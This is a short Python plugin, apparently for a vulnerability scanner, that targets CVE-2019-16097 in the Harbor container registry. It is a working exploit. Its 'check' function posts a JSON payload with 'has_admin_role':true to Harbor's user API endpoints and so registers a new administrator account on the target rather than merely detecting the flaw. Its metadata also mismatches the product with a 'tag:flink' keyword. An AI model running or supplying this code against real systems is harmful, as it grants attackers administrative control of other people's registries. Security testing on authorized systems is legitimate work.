#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests

def get_plugin_info():
    plugin_info = {
            "name": "Harbor任意用户注册(cve-2019-16097)",
            "info": "Harbor任意用户注册(cve-2019-16097)",
            "level": "高危",
            "type": "任意用户注册",
            "author": "zinc",
            "url": "",
            "keyword": "tag:flink",
            "source": 1
    }
    return plugin_info

def check(host,port,timeout):
    bug_url ="http://"+str(host)+':'+str(port)
    payload = '{"username":"ca666","email":"ca666@qq.com","realname":"ca666","password":"qwer1234","comment":"1","has_admin_role":true}'
    header = {"Content-Type": "application/json", "Accept": "application/json"}
    try:
        r = requests.post(bug_url+"/api/users", data=payload, headers=header, timeout=5)
        if r.status_code == 201:
            return True
    except:
        pass
    try:
        r = requests.post(bug_url+"/harbor/api/users", data=payload, headers=header, timeout=5)
        if r.status_code == 201:
            return True
    except:
        pass